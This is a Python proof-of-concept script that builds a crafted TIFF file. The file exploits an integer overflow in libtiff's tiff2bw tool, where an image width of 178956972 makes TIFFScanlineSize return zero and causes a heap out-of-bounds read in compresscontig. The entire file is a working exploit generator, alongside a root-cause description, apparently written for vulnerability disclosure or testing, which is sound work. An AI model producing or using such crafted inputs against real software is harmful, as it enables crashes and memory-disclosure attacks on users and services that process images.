#!/usr/bin/env python3
"""
PoC generator for VULN 002:
Heap OOB Read via Zero-Size inbuf Allocation in compresscontig (RGB CONTIG, Lower Threshold)

Source: libtiff/tools/tiff2bw.c, main() -> compresscontig(), lines 207, 240-244

Root Cause:
  TIFF with PHOTOMETRIC_RGB, PLANARCONFIG_CONTIG, SamplesPerPixel=3, BitsPerSample=8
  ImageWidth >= 178956971 causes TIFFScanlineSize() to overflow uint32 (w*3*8 > UINT32_MAX).
  Returns 0 -> _TIFFmalloc(0) -> 0-byte allocation for inbuf.
  compresscontig then loops w times reading 3 bytes each from 0-byte inbuf -> heap OOB read.
"""

import struct
import sys

OUTPUT_FILE = "vuln_002.tif"

def pack_short(v):
    return struct.pack('<H', v)

def pack_long(v):
    return struct.pack('<I', v)

def pack_rational(num, den):
    return struct.pack('<II', num, den)

def ifd_entry(tag, typ, count, value_or_offset):
    """Pack a single 12-byte IFD entry."""
    return struct.pack('<HHII', tag, typ, count, value_or_offset)

SHORT = 3
LONG  = 4
RATIONAL = 5

# ImageWidth that causes overflow: w*3*8 overflows uint32 when w >= 178956971
# Use 178956972 (just over the threshold).
IMAGE_WIDTH  = 178956972
IMAGE_LENGTH = 1

def build_tiff():
    # Layout plan (all offsets from start of file):
    #
    # 0x0000: TIFF header (8 bytes)
    # 0x0008: IFD (2 + 13*12 + 4 = 162 bytes)
    # 0x00AA: BitsPerSample data: 3 x SHORT [8,8,8] (6 bytes, padded to 8)
    # 0x00B2: XResolution RATIONAL [72, 1] (8 bytes)
    # 0x00BA: YResolution RATIONAL [72, 1] (8 bytes)
    # 0x00C2: Strip data (0 bytes, StripByteCounts=0)

    HEADER_SIZE    = 8
    NUM_ENTRIES    = 13
    IFD_SIZE       = 2 + NUM_ENTRIES * 12 + 4   # = 162

    OFF_IFD        = HEADER_SIZE                  # 8
    OFF_BITS_DATA  = OFF_IFD + IFD_SIZE           # 8 + 162 = 170 = 0xAA
    OFF_XRES       = OFF_BITS_DATA + 8            # 178 = 0xB2
    OFF_YRES       = OFF_XRES + 8                 # 186 = 0xBA
    OFF_STRIP      = OFF_YRES + 8                 # 194 = 0xC2

    # TIFF header: 'II' (little-endian), magic 42, IFD offset
    header = b'II' + struct.pack('<HI', 42, OFF_IFD)

    # IFD entries (must be sorted by tag number)
    entries = b''

    # 0x0100 ImageWidth LONG 1 178956972
    entries += ifd_entry(0x0100, LONG,  1, IMAGE_WIDTH)
    # 0x0101 ImageLength LONG 1 1
    entries += ifd_entry(0x0101, LONG,  1, IMAGE_LENGTH)
    # 0x0102 BitsPerSample SHORT 3 -> offset to [8,8,8]
    entries += ifd_entry(0x0102, SHORT, 3, OFF_BITS_DATA)
    # 0x0103 Compression SHORT 1 1 (no compression)
    entries += ifd_entry(0x0103, SHORT, 1, 1)
    # 0x0106 PhotometricInterpretation SHORT 1 2 (RGB)
    entries += ifd_entry(0x0106, SHORT, 1, 2)
    # 0x0111 StripOffsets LONG 1 -> offset to strip data
    entries += ifd_entry(0x0111, LONG,  1, OFF_STRIP)
    # 0x0115 SamplesPerPixel SHORT 1 3
    entries += ifd_entry(0x0115, SHORT, 1, 3)
    # 0x0116 RowsPerStrip LONG 1 1
    entries += ifd_entry(0x0116, LONG,  1, 1)
    # 0x0117 StripByteCounts LONG 1 0 (zero bytes; TIFFReadScanline writes 0 bytes)
    entries += ifd_entry(0x0117, LONG,  1, 0)
    # 0x011A XResolution RATIONAL 1 -> offset
    entries += ifd_entry(0x011A, RATIONAL, 1, OFF_XRES)
    # 0x011B YResolution RATIONAL 1 -> offset
    entries += ifd_entry(0x011B, RATIONAL, 1, OFF_YRES)
    # 0x011C PlanarConfig SHORT 1 1 (CONTIG)
    entries += ifd_entry(0x011C, SHORT, 1, 1)
    # 0x0128 ResolutionUnit SHORT 1 2
    entries += ifd_entry(0x0128, SHORT, 1, 2)

    assert len(entries) == NUM_ENTRIES * 12, f"Expected {NUM_ENTRIES*12} bytes, got {len(entries)}"

    ifd = struct.pack('<H', NUM_ENTRIES) + entries + struct.pack('<I', 0)  # next IFD = 0

    # BitsPerSample data: 3 SHORTs [8, 8, 8], padded to 8 bytes
    bits_data = struct.pack('<HHH', 8, 8, 8) + b'\x00\x00'

    # Resolution rationals
    xres_data = pack_rational(72, 1)
    yres_data = pack_rational(72, 1)

    # Strip data: 0 bytes (StripByteCounts=0; TIFFReadScanline will return success writing 0 bytes)
    strip_data = b''

    tiff_bytes = header + ifd + bits_data + xres_data + yres_data + strip_data

    # Verify offsets
    assert len(header) == HEADER_SIZE
    assert len(header) + len(ifd) == OFF_BITS_DATA, \
        f"OFF_BITS_DATA mismatch: expected {OFF_BITS_DATA}, got {len(header)+len(ifd)}"
    assert len(header) + len(ifd) + len(bits_data) == OFF_XRES, \
        f"OFF_XRES mismatch"
    assert len(header) + len(ifd) + len(bits_data) + len(xres_data) == OFF_YRES, \
        f"OFF_YRES mismatch"
    assert len(tiff_bytes) == OFF_STRIP, \
        f"OFF_STRIP mismatch: expected {OFF_STRIP}, got {len(tiff_bytes)}"

    return tiff_bytes

def main():
    data = build_tiff()
    with open(OUTPUT_FILE, 'wb') as f:
        f.write(data)
    print(f"[+] Written {len(data)} bytes to {OUTPUT_FILE}")
    print(f"[+] ImageWidth = {IMAGE_WIDTH} (triggers uint32 overflow in TIFFScanlineSize)")
    print(f"[+] Expected: inbuf = _TIFFmalloc(0), heap OOB read in compresscontig()")

if __name__ == '__main__':
    main()
